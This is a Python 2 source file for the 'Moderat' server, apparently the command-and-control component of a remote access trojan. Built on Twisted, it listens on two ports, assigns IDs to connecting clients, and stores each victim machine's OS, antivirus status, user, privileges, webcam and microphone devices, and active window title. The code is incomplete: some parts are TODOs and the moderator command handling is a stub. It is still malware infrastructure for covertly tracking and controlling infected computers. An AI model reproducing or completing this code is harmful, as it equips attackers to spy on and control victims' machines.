from twisted.internet.protocol import Protocol, ServerFactory
from twisted.internet import reactor, task

import string
import random
import ast


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class ModeratServerProtocol(Protocol):

    # New Connection Made
    def connectionMade(self):
        self.send_message_to_client(self, 'connectSuccess', 'welcome')

    def connectionLost(self, reason):
        self.factory.clients = {key: value for key, value in self.factory.clients.items() if value is not self}

    def dataReceived(self, data):
        # Data Received
        command = self.recieve_message(data)
        # Switch to client commands
        if command['from'] == 'client':
            self.client_commands(command['payload'], command['mode'])
        # Switch to moderator commands
        elif command['from'] == 'moderator':
            self.moderator_commands(command['payload'], command['mode'])

    def client_commands(self, payload, mode):

        # Clients Initializing
        if mode == 'clientInitializing':

            # If client has no key generate new one and send
            if payload == 'noKey':
                key = id_generator()
                # TODO: Write Client db
                self.send_message_to_client(self, key, 'clientInitializing')

            # else get key from client
            else:
                key = payload
                # TODO: Check DB
                self.send_message_to_client(self, key, 'clientInitializing')
            self.factory.clients[payload] = {
                'id': key,
                'sock': self,
            }
            print '[*] New Client from %s' % self.transport.getHost()

        # Clients Status Checker
        elif mode == 'infoChecker':
            if self.factory.clients.has_key(payload['key']):
                self.factory.clients[payload['key']] = {
                    'ip_address':           self.transport.getHost().host,
                    'ostype':               payload['os_type'],
                    'os':                   payload['os'],
                    'protection':           payload['protection'],
                    'user':                 payload['user'],
                    'privileges':           payload['privileges'],
                    'inputdevice':          payload['audio_device'],
                    'webcamdevice':         payload['webcamera_device'],
                    'activewindowtitle':    payload['window_title'],
                    'keypassword':          payload['key'],
                }
            else:
                pass

    def moderator_commands(self, payload, client_id):
        print 'send'

    def recieve_message(self, data, end='[ENDOFMESSAGE]'):
        return ast.literal_eval(data[:-len(end)].decode('utf-8'))

    def send_message_to_client(self, client, message, mode, _from='server', end='[ENDOFMESSAGE]'):
        # Send Data Function
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
        }
        client.transport.write(str(message)+end)

    def send_message_to_moderator(self, moderator, message):
        self.factory.clients[moderator]['sock'].transport.write(str(message))


class ModeratServerFactory(ServerFactory):

    protocol = ModeratServerProtocol

    def __init__(self):
        self.clients = {}


reactor.listenTCP(4434, ModeratServerFactory())
reactor.listenTCP(1313, ModeratServerFactory())
reactor.run()